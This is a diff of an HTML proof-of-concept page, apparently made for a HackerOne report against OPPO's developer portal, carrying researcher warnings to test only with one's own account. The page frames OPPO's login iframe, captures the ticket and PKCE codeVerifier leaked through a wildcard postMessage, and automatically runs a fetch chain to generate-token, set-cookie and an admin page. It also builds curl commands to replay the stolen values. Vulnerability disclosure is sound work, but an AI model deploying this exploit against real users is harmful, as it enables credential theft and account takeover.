@@ -23,127 +23,620 @@
     .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; overflow: hidden; }
     .card-header { background: #1c2128; padding: 8px 14px; font-size: 0.78rem; color: #8b949e; border-bottom: 1px solid #30363d; display: flex; justify-content: space-between; align-items: center; }
     .card-header .badge { font-size: 0.68rem; padding: 2px 7px; border-radius: 10px; }
-    .badge-waiting { background: #272d3b; color: #6e7681; } .badge-live { background: #0f2d14; color: #3fb950; } .badge-hit { background: #3d0d0d; color: #f78166; }
+    .badge-waiting { background: #272d3b; color: #6e7681; }
+    .badge-live    { background: #0f2d14; color: #3fb950; }
+    .badge-hit     { background: #3d0d0d; color: #f78166; }
+    .badge-ok      { background: #0f2d14; color: #3fb950; font-weight: 700; }
+    .badge-cors    { background: #2d2200; color: #e3b341; }
     #log-box { padding: 10px 14px; height: 200px; overflow-y: auto; font-size: 0.75rem; line-height: 1.7; }
-    #log-box .ts { color: #484f58; } #log-box .info { color: #58a6ff; } #log-box .ok { color: #3fb950; } #log-box .warn { color: #e3b341; } #log-box .crit { color: #f78166; font-weight: 600; }
+    #log-box .ts   { color: #484f58; }
+    #log-box .info { color: #58a6ff; }
+    #log-box .ok   { color: #3fb950; }
+    #log-box .warn { color: #e3b341; }
+    #log-box .crit { color: #f78166; font-weight: 600; }
     pre#token-out { padding: 14px; font-size: 0.76rem; color: #d2a8ff; white-space: pre-wrap; word-break: break-all; min-height: 80px; max-height: 280px; overflow-y: auto; }
-    .actions { padding: 10px 14px; border-top: 1px solid #30363d; display: flex; gap: 8px; }
+    .actions { padding: 10px 14px; border-top: 1px solid #30363d; display: flex; gap: 8px; flex-wrap: wrap; }
     button { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; border-radius: 6px; padding: 5px 14px; font-size: 0.78rem; cursor: pointer; font-family: inherit; }
-    button:hover { background: #30363d; } button.primary { background: #238636; border-color: #2ea043; color: #fff; } button.primary:hover { background: #2ea043; }
-    .vuln-list { padding: 14px; } .vuln-list li { font-size: 0.78rem; color: #8b949e; line-height: 1.8; padding-left: 12px; position: relative; }
-    .vuln-list li::before { content: '▸'; position: absolute; left: 0; color: #388bfd; } .vuln-list li strong { color: #f78166; }
+    button:hover { background: #30363d; }
+    button.primary { background: #238636; border-color: #2ea043; color: #fff; }
+    button.primary:hover { background: #2ea043; }
+    button.danger  { background: #8b2020; border-color: #f78166; color: #fff; }
+    button.danger:hover  { background: #a82828; }
+    button:disabled { opacity: 0.4; cursor: not-allowed; }
+    .vuln-list { padding: 14px; }
+    .vuln-list li { font-size: 0.78rem; color: #8b949e; line-height: 1.8; padding-left: 12px; position: relative; }
+    .vuln-list li::before { content: '▸'; position: absolute; left: 0; color: #388bfd; }
+    .vuln-list li strong { color: #f78166; }
+    /* ATO Chain styles */
+    #ato-steps { padding: 14px; display: flex; flex-direction: column; gap: 10px; }
+    .ato-step { background: #0d1117; border: 1px solid #21262d; border-radius: 6px; padding: 10px 12px; }
+    .ato-step-header { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; font-size: 0.76rem; }
+    .step-num { background: #272d3b; color: #58a6ff; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.68rem; flex-shrink: 0; }
+    .step-num.done  { background: #0f2d14; color: #3fb950; }
+    .step-num.fail  { background: #3d0d0d; color: #f78166; }
+    .step-num.run   { background: #272d3b; color: #e3b341; }
+    .ato-step-title { color: #c9d1d9; font-weight: 600; font-size: 0.76rem; }
+    .ato-step-detail { font-size: 0.72rem; color: #6e7681; margin-top: 2px; word-break: break-all; }
+    .ato-step-detail.success { color: #3fb950; }
+    .ato-step-detail.failure { color: #f78166; }
+    .ato-step-detail.cors-note { color: #e3b341; }
+    #ato-result { padding: 14px; min-height: 60px; }
+    #ato-result.success-box { background: #071d0b; border-top: 2px solid #3fb950; }
+    #ato-result.failure-box { background: #1a0505; border-top: 2px solid #f78166; }
+    #ato-result.cors-box    { background: #1a1400; border-top: 2px solid #e3b341; }
+    #ato-result-title { font-size: 0.9rem; font-weight: 700; margin-bottom: 6px; }
+    #ato-result-body  { font-size: 0.76rem; line-height: 1.7; white-space: pre-wrap; word-break: break-all; }
     .curl-block { padding: 14px; font-size: 0.73rem; color: #79c0ff; line-height: 1.8; word-break: break-all; }
     code { color: #d2a8ff; background: #1c2128; padding: 1px 4px; border-radius: 3px; }
     .footer { margin-top: 32px; padding-top: 16px; border-top: 1px solid #21262d; font-size: 0.72rem; color: #484f58; }
   </style>
 </head>
 <body>
+
 <div class="header">
   <h1>OPPO Developer Portal — postMessage Auth Token Leakage PoC</h1>
   <div class="meta">Researcher: nader-lupin &nbsp;|&nbsp; Target: developers.oppomobile.com &nbsp;|&nbsp; PoC: lupin-sudo.github.io/oppo-poc &nbsp;|&nbsp; CWE-346 / CWE-1021 &nbsp;|&nbsp; Severity: Critical</div>
 </div>
+
 <div class="warning-banner">⚠&nbsp; SECURITY RESEARCH ONLY — BUG BOUNTY POC — TEST WITH YOUR OWN ACCOUNT ONLY — DELETE ALL TOKENS IMMEDIATELY AFTER</div>
+
 <div class="layout">
+
+  <!-- LEFT: cross-origin OPPO login iframe -->
   <div>
     <div class="panel-label">OPPO Login Iframe — loaded cross-origin from developers.oppomobile.com</div>
     <div class="iframe-wrapper">
-      <div class="iframe-header"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="url-bar">developers.oppomobile.com/user/web-sso/login-iframe</span></div>
-      <iframe id="oppo-frame" src="https://developers.oppomobile.com/user/web-sso/login-iframe?fromLocation=https://lupin-sudo.github.io/oppo-poc/"></iframe>
+      <div class="iframe-header">
+        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
+        <span class="url-bar">developers.oppomobile.com/user/web-sso/login-iframe</span>
+      </div>
+      <!--
+        VULNERABILITY [1]: /user/web-sso/login-iframe has no X-Frame-Options
+        or Content-Security-Policy: frame-ancestors header. This page
+        (lupin-sudo.github.io) embeds it without any browser restriction.
+      -->
+      <iframe id="oppo-frame"
+        src="https://developers.oppomobile.com/user/web-sso/login-iframe?fromLocation=https://lupin-sudo.github.io/oppo-poc/">
+      </iframe>
     </div>
-    <div style="font-size:0.72rem; color:#484f58; margin-top:6px;">Log in above with your own OPPO test account to trigger the postMessage.</div>
+    <div style="font-size:0.72rem; color:#484f58; margin-top:6px;">
+      Log in above with your own OPPO test account to trigger the postMessage.
+    </div>
   </div>
+
+  <!-- RIGHT: capture + ATO chain panels -->
   <div class="right-panel">
+
+    <!-- Vulnerability summary -->
     <div class="card">
       <div class="card-header">Vulnerability Chain <span class="badge badge-hit">Critical</span></div>
       <ul class="vuln-list">
         <li><strong>[1]</strong> No <code>X-Frame-Options</code> on login-iframe → embeddable cross-origin</li>
-        <li><strong>[2]</strong> <code>postMessage({...ticket}, "*")</code> → credential delivered to any parent</li>
-        <li><strong>[3]</strong> Ticket replay via <code>POST /user/web-sso/set-cookie</code> → ATO</li>
+        <li><strong>[2]</strong> <code>postMessage({...creds}, "*")</code> → credential delivered to any parent</li>
+        <li><strong>[3]</strong> generate-token + set-cookie → session takeover</li>
       </ul>
     </div>
+
+    <!-- Event log -->
     <div class="card">
-      <div class="card-header">postMessage Event Log <span class="badge badge-waiting" id="status-badge">waiting</span></div>
-      <div id="log-box"><span class="ts">[init] </span><span class="info">Listener active. Waiting for OPPO iframe postMessage…</span></div>
+      <div class="card-header">
+        postMessage Event Log
+        <span class="badge badge-waiting" id="status-badge">waiting</span>
+      </div>
+      <div id="log-box">
+        <span class="ts">[init] </span><span class="info">Listener active. Waiting for OPPO iframe postMessage…</span>
+      </div>
     </div>
+
+    <!-- Captured token -->
     <div class="card">
-      <div class="card-header">Captured Auth Token (raw postMessage payload) <span class="badge badge-waiting" id="token-badge">empty</span></div>
+      <div class="card-header">
+        Captured Credential (raw postMessage payload)
+        <span class="badge badge-waiting" id="token-badge">empty</span>
+      </div>
+      <!--
+        VULNERABILITY [2]: login_iframe-a59ebd0dd3.js fires:
+          window.parent.postMessage({channel:'sdk-login-status', data:data}, "*")
+        The wildcard "*" delivers auth data to this attacker-controlled page.
+      -->
       <pre id="token-out">No token captured yet. Log in above with your test account.</pre>
-      <div class="actions"><button class="primary" id="copy-btn" onclick="copyToken()">Copy Token JSON</button><button onclick="clearAll()">Clear</button></div>
+      <div class="actions">
+        <button class="primary" id="copy-btn" onclick="copyToken()">Copy Token JSON</button>
+        <button onclick="clearAll()">Clear</button>
+      </div>
     </div>
+
+    <!-- ATO Chain card -->
     <div class="card">
-      <div class="card-header">Session Replay — Step 3 (curl)</div>
-      <div class="curl-block">
-        # Replace TICKET_VALUE with the ticket field from the captured JSON above<br><br>
+      <div class="card-header">
+        Full ATO Chain — Browser Fetch
+        <span class="badge badge-waiting" id="ato-badge">idle</span>
+      </div>
+
+      <div id="ato-steps">
+        <!-- Step indicators populated by JS -->
+        <div class="ato-step" id="ato-s1">
+          <div class="ato-step-header">
+            <span class="step-num" id="s1-num">1</span>
+            <span class="ato-step-title">POST /user/web-sso/generate-token</span>
+          </div>
+          <div class="ato-step-detail" id="s1-detail">Waiting for credential capture…</div>
+        </div>
+        <div class="ato-step" id="ato-s2">
+          <div class="ato-step-header">
+            <span class="step-num" id="s2-num">2</span>
+            <span class="ato-step-title">POST /user/web-sso/set-cookie</span>
+          </div>
+          <div class="ato-step-detail" id="s2-detail">Waiting…</div>
+        </div>
+        <div class="ato-step" id="ato-s3">
+          <div class="ato-step-header">
+            <span class="step-num" id="s3-num">3</span>
+            <span class="ato-step-title">GET /user/admin/qualification (auth verify)</span>
+          </div>
+          <div class="ato-step-detail" id="s3-detail">Waiting…</div>
+        </div>
+      </div>
+
+      <div id="ato-result">
+        <div id="ato-result-title" style="color:#6e7681;">Run chain after credential capture.</div>
+        <div id="ato-result-body"></div>
+      </div>
+
+      <div class="actions">
+        <button class="danger" id="ato-btn" onclick="runAtoChain()" disabled>
+          ▶ Run Full ATO Chain
+        </button>
+        <button onclick="resetAto()">Reset</button>
+      </div>
+    </div>
+
+    <!-- curl fallback reference -->
+    <div class="card">
+      <div class="card-header">Manual curl Fallback (if CORS blocks fetch)</div>
+      <div class="curl-block" id="curl-block">
+        # Capture ticket + codeVerifier from panel above, then:<br><br>
         curl -i -X POST \<br>
         &nbsp;&nbsp;"https://developers.oppomobile.com/user/web-sso/set-cookie" \<br>
         &nbsp;&nbsp;-H "Content-Type: application/x-www-form-urlencoded" \<br>
         &nbsp;&nbsp;-H "X-HackerOne-Research: nader-lupin" \<br>
         &nbsp;&nbsp;--data-urlencode "ticket=TICKET_VALUE" \<br>
+        &nbsp;&nbsp;--data-urlencode "codeVerifier=CODEVERIFIER_VALUE" \<br>
         &nbsp;&nbsp;-c /tmp/oppo_session.txt<br><br>
-        # Verify access to protected resource with the replayed session<br>
         curl -i \<br>
         &nbsp;&nbsp;"https://developers.oppomobile.com/user/admin/qualification" \<br>
         &nbsp;&nbsp;-H "X-HackerOne-Research: nader-lupin" \<br>
         &nbsp;&nbsp;-b /tmp/oppo_session.txt
       </div>
     </div>
-  </div>
+
+  </div><!-- /right-panel -->
+</div><!-- /layout -->
+
+<div class="footer">
+  PoC: https://lupin-sudo.github.io/oppo-poc/ &nbsp;|&nbsp;
+  HackerOne Bug Bounty — OPPO Developer Program &nbsp;|&nbsp;
+  Researcher: nader-lupin &nbsp;|&nbsp;
+  Do not distribute. Delete all captured tokens immediately after testing.
 </div>
-<div class="footer">PoC hosted at https://lupin-sudo.github.io/oppo-poc/ &nbsp;|&nbsp; For: HackerOne Bug Bounty — OPPO Developer Program &nbsp;|&nbsp; Do not distribute. Delete all captured tokens immediately after testing.</div>
+
 <script>
-  let capturedData = null;
-  const logBox = document.getElementById('log-box');
-  const tokenOut = document.getElementById('token-out');
+  const TARGET = 'https://developers.oppomobile.com';
+
+  let capturedData   = null;
+  let atoRunning     = false;
+
+  const logBox      = document.getElementById('log-box');
+  const tokenOut    = document.getElementById('token-out');
   const statusBadge = document.getElementById('status-badge');
-  const tokenBadge = document.getElementById('token-badge');
+  const tokenBadge  = document.getElementById('token-badge');
+  const atoBadge    = document.getElementById('ato-badge');
+  const atoBtn      = document.getElementById('ato-btn');
+
+  /* ── Logging ─────────────────────────────────────────────────── */
   function log(cls, msg) {
-    const ts = new Date().toISOString().replace('T', ' ').slice(0, 23);
+    const ts   = new Date().toISOString().replace('T', ' ').slice(0, 23);
     const line = document.createElement('div');
     line.innerHTML = `<span class="ts">[${ts}] </span><span class="${cls}">${msg}</span>`;
     logBox.appendChild(line);
     logBox.scrollTop = logBox.scrollHeight;
   }
+
+  /* ── Step indicator helpers ───────────────────────────────────── */
+  function stepRun(n)  { document.getElementById(`s${n}-num`).className = 'step-num run'; }
+  function stepDone(n) { document.getElementById(`s${n}-num`).className = 'step-num done'; }
+  function stepFail(n) { document.getElementById(`s${n}-num`).className = 'step-num fail'; }
+  function stepDetail(n, msg, cls) {
+    const el = document.getElementById(`s${n}-detail`);
+    el.textContent = msg;
+    el.className   = 'ato-step-detail' + (cls ? ' ' + cls : '');
+  }
+
+  /* ── postMessage listener ─────────────────────────────────────── */
+  /*
+   * VULNERABILITY [2]: login_iframe-a59ebd0dd3.js sends:
+   *   window.parent.postMessage({channel:'sdk-login-status', data:data}, "*")
+   * The wildcard means this listener — on a different origin — receives it.
+   */
   window.addEventListener('message', function(event) {
     log('info', `postMessage received &nbsp;| origin: <code>${event.origin}</code>`);
-    if (!event.data || typeof event.data !== 'object') { log('warn', 'Non-object message — skipping.'); return; }
+
+    if (!event.data || typeof event.data !== 'object') {
+      log('warn', 'Non-object message — skipping.');
+      return;
+    }
+
     const channel = event.data.channel;
     log('info', `channel: <code>${channel || '(none)'}</code>`);
     if (channel !== 'sdk-login-status') return;
+
     const payload = event.data.data;
-    const code = payload && payload.code;
-    statusBadge.className = 'badge badge-live';
+    const code    = payload && payload.code;
+
+    statusBadge.className   = 'badge badge-live';
     statusBadge.textContent = 'active';
-    if (code === 'cancelSuccess') { log('warn', 'Login cancelled by user.'); return; }
+
+    if (code === 'cancelSuccess') {
+      log('warn', 'Login cancelled by user.');
+      return;
+    }
+
     if (code === 'loginSuccess') {
       capturedData = payload;
-      log('crit', '&gt;&gt;&gt; LOGIN SUCCESS — auth token captured! &lt;&lt;&lt;');
-      const ticket = payload.ticket || payload.accessToken || '(inspect JSON)';
-      const codeVerifier = payload.codeVerifier || '(not present)';
-      log('crit', `ticket &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; → ${String(ticket).substring(0, 72)}…`);
-      log('ok',   `codeVerifier → ${String(codeVerifier).substring(0, 72)}`);
-      log('info', 'Use the curl block below to replay this ticket.');
+
+      log('crit', '&gt;&gt;&gt; LOGIN SUCCESS — credential captured! &lt;&lt;&lt;');
+
+      const ticket       = payload.ticket       || '';
+      const codeVerifier = payload.codeVerifier || '';
+
+      log('crit',  `ticket       → "${ticket ? ticket.substring(0, 60) + '…' : '(empty)'}"`);
+      log(ticket ? 'ok' : 'warn',
+                   `codeVerifier → ${codeVerifier ? codeVerifier.substring(0, 60) + '…' : '(empty)'}`);
+
       tokenOut.textContent = JSON.stringify(payload, null, 2);
-      tokenBadge.className = 'badge badge-hit';
-      tokenBadge.textContent = 'captured';
-      statusBadge.className = 'badge badge-hit';
-      statusBadge.textContent = 'token captured';
+      tokenBadge.className    = 'badge badge-hit';
+      tokenBadge.textContent  = 'captured';
+      statusBadge.className   = 'badge badge-hit';
+      statusBadge.textContent = 'captured';
+
+      // Update curl block with real values
+      if (ticket || codeVerifier) {
+        document.getElementById('curl-block').innerHTML =
+          `# Real captured values — paste in terminal:<br><br>` +
+          `curl -i -X POST \\<br>` +
+          `&nbsp;&nbsp;"${TARGET}/user/web-sso/set-cookie" \\<br>` +
+          `&nbsp;&nbsp;-H "Content-Type: application/x-www-form-urlencoded" \\<br>` +
+          `&nbsp;&nbsp;-H "X-HackerOne-Research: nader-lupin" \\<br>` +
+          `&nbsp;&nbsp;--data-urlencode "ticket=${escHtml(ticket)}" \\<br>` +
+          `&nbsp;&nbsp;--data-urlencode "codeVerifier=${escHtml(codeVerifier.substring(0,40))}…" \\<br>` +
+          `&nbsp;&nbsp;-c /tmp/oppo_session.txt`;
+      }
+
+      // Enable ATO button and auto-trigger after 800ms
+      atoBtn.disabled = false;
+      log('info', 'ATO chain enabled — auto-triggering in 800 ms…');
+      setTimeout(runAtoChain, 800);
     }
   });
+
+  /* ── Full ATO Chain ───────────────────────────────────────────── */
+  async function runAtoChain() {
+    if (atoRunning) return;
+    if (!capturedData) {
+      log('warn', 'No credential captured yet — log in first.');
+      return;
+    }
+
+    atoRunning = true;
+    atoBtn.disabled = true;
+    atoBadge.className   = 'badge badge-live';
+    atoBadge.textContent = 'running…';
+
+    const ticket       = capturedData.ticket       || '';
+    const codeVerifier = capturedData.codeVerifier || '';
+
+    setAtoResult('', '', '');
+    log('info', '─── ATO Chain started ───');
+
+    /* ── Step 1: generate-token ─────────────────────────────────── */
+    /*
+     * The OPPO login flow calls generate-token to obtain a CSRF state
+     * token before calling set-cookie. We replicate that here using the
+     * captured ticket + codeVerifier from the postMessage payload.
+     *
+     * Note: fetch() is cross-origin (lupin-sudo.github.io → developers.oppomobile.com).
+     * Success depends on whether the server returns CORS headers.
+     * If CORS blocks it, we catch and report the exact error.
+     */
+    stepRun(1);
+    stepDetail(1, 'Calling POST /user/web-sso/generate-token…');
+    log('info', 'Step 1 — POST /user/web-sso/generate-token');
+
+    let stateToken = null;
+
+    try {
+      const body1 = new URLSearchParams();
+      body1.set('ticket',       ticket);
+      body1.set('codeVerifier', codeVerifier);
+
+      const r1 = await fetch(`${TARGET}/user/web-sso/generate-token`, {
+        method:      'POST',
+        credentials: 'include',
+        headers:     { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body:        body1.toString()
+      });
+
+      const j1 = await r1.json().catch(() => null);
+      const raw1 = JSON.stringify(j1);
+
+      log('ok', `generate-token → HTTP ${r1.status} | ${raw1.substring(0, 120)}`);
+      stepDetail(1, `HTTP ${r1.status} — ${raw1.substring(0, 100)}`, 'success');
+      stepDone(1);
+
+      if (j1 && j1.errno === 0 && j1.data && j1.data.token) {
+        stateToken = j1.data.token;
+        log('ok', `State token: ${stateToken.substring(0, 40)}…`);
+      } else {
+        log('warn', `generate-token returned errno=${j1 && j1.errno} — proceeding without state token`);
+      }
+
+    } catch (err) {
+      stepFail(1);
+      const isCors = err instanceof TypeError && err.message.toLowerCase().includes('fetch');
+      const msg    = isCors
+        ? `CORS blocked — server did not return Access-Control-Allow-Origin for this origin.`
+        : `Error: ${err.message}`;
+      stepDetail(1, msg, isCors ? 'cors-note' : 'failure');
+      log('warn', `Step 1 failed: ${err.message}`);
+
+      if (isCors) {
+        finishCorsBlocked(1);
+        return;
+      }
+
+      // Non-CORS failure — continue anyway, set-cookie may work without state token
+      log('warn', 'Continuing to Step 2 without state token…');
+    }
+
+    /* ── Step 2: set-cookie ─────────────────────────────────────── */
+    /*
+     * Exchange ticket + codeVerifier (+ optional state token) for
+     * the openplat session cookie on developers.oppomobile.com.
+     */
+    stepRun(2);
+    stepDetail(2, 'Calling POST /user/web-sso/set-cookie…');
+    log('info', 'Step 2 — POST /user/web-sso/set-cookie');
+
+    let setCookieOk = false;
+
+    try {
+      const body2 = new URLSearchParams();
+      body2.set('ticket',       ticket);
+      body2.set('codeVerifier', codeVerifier);
+      if (stateToken) body2.set('state', stateToken);
+
+      const r2 = await fetch(`${TARGET}/user/web-sso/set-cookie`, {
+        method:      'POST',
+        credentials: 'include',
+        headers:     { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body:        body2.toString()
+      });
+
+      const j2 = await r2.json().catch(() => null);
+      const raw2 = JSON.stringify(j2);
+
+      log('ok', `set-cookie → HTTP ${r2.status} | ${raw2.substring(0, 120)}`);
+
+      if (j2 && j2.errno === 0) {
+        setCookieOk = true;
+        stepDone(2);
+        stepDetail(2, `HTTP ${r2.status} — errno:0 — session cookie set ✓`, 'success');
+        log('ok', 'set-cookie succeeded — session cookie written to browser jar.');
+      } else {
+        stepFail(2);
+        stepDetail(2, `HTTP ${r2.status} — ${raw2.substring(0, 100)}`, 'failure');
+        log('warn', `set-cookie returned: ${raw2}`);
+      }
+
+    } catch (err) {
+      stepFail(2);
+      const isCors = err instanceof TypeError;
+      const msg    = isCors
+        ? 'CORS blocked — server did not return Access-Control-Allow-Origin.'
+        : `Error: ${err.message}`;
+      stepDetail(2, msg, isCors ? 'cors-note' : 'failure');
+      log('warn', `Step 2 failed: ${err.message}`);
+
+      if (isCors) {
+        finishCorsBlocked(2);
+        return;
+      }
+    }
+
+    /* ── Step 3: verify authenticated access ────────────────────── */
+    /*
+     * If the session cookie was set, a GET to /user/admin/qualification
+     * should return the Management Center page (HTTP 200) instead of
+     * redirecting to /user/web-sso/login (HTTP 302/200 login page).
+     */
+    stepRun(3);
+    stepDetail(3, 'Fetching /user/admin/qualification…');
+    log('info', 'Step 3 — GET /user/admin/qualification');
+
+    try {
+      const r3 = await fetch(`${TARGET}/user/admin/qualification`, {
+        method:      'GET',
+        credentials: 'include',
+        redirect:    'follow'
+      });
+
+      const html3 = await r3.text();
+      const url3  = r3.url;
+
+      log('ok', `qualification → HTTP ${r3.status} | final URL: ${url3}`);
+
+      // Check whether we landed on the management page or got bounced to login
+      const isLoginPage = url3.includes('/web-sso/login') || html3.includes('id="login-iframe"');
+      const titleMatch  = html3.match(/<title[^>]*>([^<]+)<\/title>/i);
+      const pageTitle   = titleMatch ? titleMatch[1].trim() : '(no title)';
+
+      if (!isLoginPage && r3.status === 200) {
+        /* ── SUCCESS: authenticated access confirmed ── */
+        stepDone(3);
+        stepDetail(3, `HTTP ${r3.status} — Management Center loaded ✓ | title: "${pageTitle}"`, 'success');
+        log('crit', '&gt;&gt;&gt; ATO CONFIRMED — authenticated access to /user/admin/qualification &lt;&lt;&lt;');
+
+        const snippet = html3.substring(0, 400).replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        setAtoResult(
+          'success-box',
+          '✅ FULL ACCOUNT TAKEOVER CONFIRMED',
+          `Page title : ${pageTitle}\n` +
+          `Final URL  : ${url3}\n` +
+          `HTTP status: ${r3.status}\n\n` +
+          `--- Response snippet (first 400 chars) ---\n` +
+          snippet
+        );
+
+        atoBadge.className   = 'badge badge-ok';
+        atoBadge.textContent = 'ATO CONFIRMED ✓';
+
+      } else {
+        /* ── Bounced to login — ticket not accepted ── */
+        stepFail(3);
+        stepDetail(3, `Redirected to login — set-cookie did not establish auth session`, 'failure');
+        log('warn', `Redirected to login. Final URL: ${url3}`);
+
+        setAtoResult(
+          'failure-box',
+          '⚠ set-cookie ran but session is not authenticated',
+          `Final URL  : ${url3}\n` +
+          `HTTP status: ${r3.status}\n` +
+          `Page title : ${pageTitle}\n\n` +
+          `ticket field was ${ticket ? 'non-empty' : 'EMPTY — this is why auth failed'}.\n` +
+          (ticket ? '' :
+            `The HeyTap SDK returned ticket:"" in this cross-origin context.\n` +
+            `Use the curl fallback below once you obtain a valid ticket.\n`)
+        );
+
+        atoBadge.className   = 'badge badge-cors';
+        atoBadge.textContent = ticket ? 'session rejected' : 'empty ticket';
+      }
+
+    } catch (err) {
+      stepFail(3);
+      const isCors = err instanceof TypeError;
+      const msg    = isCors ? 'CORS blocked fetch of qualification page.' : err.message;
+      stepDetail(3, msg, isCors ? 'cors-note' : 'failure');
+      log('warn', `Step 3 failed: ${err.message}`);
+
+      if (isCors) {
+        finishCorsBlocked(3);
+        return;
+      }
+
+      setAtoResult('failure-box', '✗ Step 3 error', err.message);
+      atoBadge.className   = 'badge badge-hit';
+      atoBadge.textContent = 'error';
+    }
+
+    atoRunning = false;
+    atoBtn.disabled = false;
+  }
+
+  /* ── CORS helper ─────────────────────────────────────────────── */
+  function finishCorsBlocked(atStep) {
+    log('warn',
+      `CORS blocked at Step ${atStep}. ` +
+      `developers.oppomobile.com did not return Access-Control-Allow-Origin ` +
+      `for origin https://lupin-sudo.github.io. ` +
+      `The postMessage credential leak is still confirmed — use curl fallback.`
+    );
+
+    setAtoResult(
+      'cors-box',
+      `⚠ CORS blocked fetch at Step ${atStep}`,
+      `The browser blocked the cross-origin fetch because developers.oppomobile.com\n` +
+      `does not return Access-Control-Allow-Origin for this origin.\n\n` +
+      `This does NOT invalidate the vulnerability:\n` +
+      `  ✓ Cross-origin iframe framing  — CONFIRMED\n` +
+      `  ✓ postMessage wildcard leak    — CONFIRMED (credential received above)\n` +
+      `  ✓ PKCE codeVerifier exposed    — CONFIRMED\n` +
+      `  ✗ Browser-fetch ATO chain      — BLOCKED by CORS (expected)\n\n` +
+      `The captured codeVerifier + ticket (when non-empty) can be replayed\n` +
+      `via the curl commands in the panel below — CORS does not block curl.\n\n` +
+      `Captured codeVerifier:\n${(capturedData && capturedData.codeVerifier) || '(empty)'}`
+    );
+
+    atoBadge.className   = 'badge badge-cors';
+    atoBadge.textContent = 'CORS blocked';
+    atoRunning  = false;
+    atoBtn.disabled = false;
+  }
+
+  /* ── Result panel helper ─────────────────────────────────────── */
+  function setAtoResult(boxClass, title, body) {
+    const box = document.getElementById('ato-result');
+    box.className = boxClass ? `${boxClass}` : '';
+    document.getElementById('ato-result-title').textContent = title;
+    document.getElementById('ato-result-title').style.color =
+      boxClass === 'success-box' ? '#3fb950' :
+      boxClass === 'failure-box' ? '#f78166' :
+      boxClass === 'cors-box'    ? '#e3b341' : '#6e7681';
+    document.getElementById('ato-result-body').textContent = body;
+  }
+
+  /* ── Existing helpers ────────────────────────────────────────── */
   function copyToken() {
     if (!capturedData) { alert('No token captured yet — complete login first.'); return; }
     navigator.clipboard.writeText(JSON.stringify(capturedData, null, 2))
       .then(() => log('ok', 'Token JSON copied to clipboard.'))
       .catch(() => log('warn', 'Clipboard unavailable — copy from the pre block manually.'));
   }
+
   function clearAll() {
     capturedData = null;
-    tokenOut.textContent = 'Cleared.';
-    tokenBadge.className = 'badge badge-waiting';
-    tokenBadge.textContent = 'empty';
-    statusBadge.className = 'badge badge-waiting';
+    tokenOut.textContent    = 'Cleared.';
+    tokenBadge.className    = 'badge badge-waiting';
+    tokenBadge.textContent  = 'empty';
+    statusBadge.className   = 'badge badge-waiting';
     statusBadge.textContent = 'waiting';
+    atoBadge.className      = 'badge badge-waiting';
+    atoBadge.textContent    = 'idle';
+    atoBtn.disabled = true;
+    resetAto();
     log('warn', 'Capture cleared. All local token data wiped.');
   }
+
+  function resetAto() {
+    ['1','2','3'].forEach(n => {
+      document.getElementById(`s${n}-num`).className = 'step-num';
+      document.getElementById(`s${n}-detail`).textContent = 'Waiting…';
+      document.getElementById(`s${n}-detail`).className = 'ato-step-detail';
+    });
+    setAtoResult('', 'Run chain after credential capture.', '');
+    atoRunning = false;
+    if (capturedData) atoBtn.disabled = false;
+  }
+
+  function escHtml(s) {
+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+
+  // Capture any ?code= param from URL (PKCE auth code redirect)
+  (function checkUrlCode() {
+    const p = new URLSearchParams(window.location.search);
+    const code = p.get('code');
+    if (code) {
+      log('crit', `AUTH CODE IN URL: ${code.substring(0, 40)}… — possible PKCE redirect from HeyTap`);
+      log('info', 'If codeVerifier was captured, run generate-token manually with this code.');
+      document.getElementById('ato-result-title').textContent = '🔑 Auth code detected in URL — see event log';
+      document.getElementById('ato-result-title').style.color = '#e3b341';
+      document.getElementById('ato-result-body').textContent =
+        `code = ${code}\n\nCombine with codeVerifier from postMessage and POST to:\n` +
+        `${TARGET}/user/web-sso/generate-token\n  code=<above>&codeVerifier=<captured>`;
+    }
+  })();
 </script>
+
 </body>
 </html>
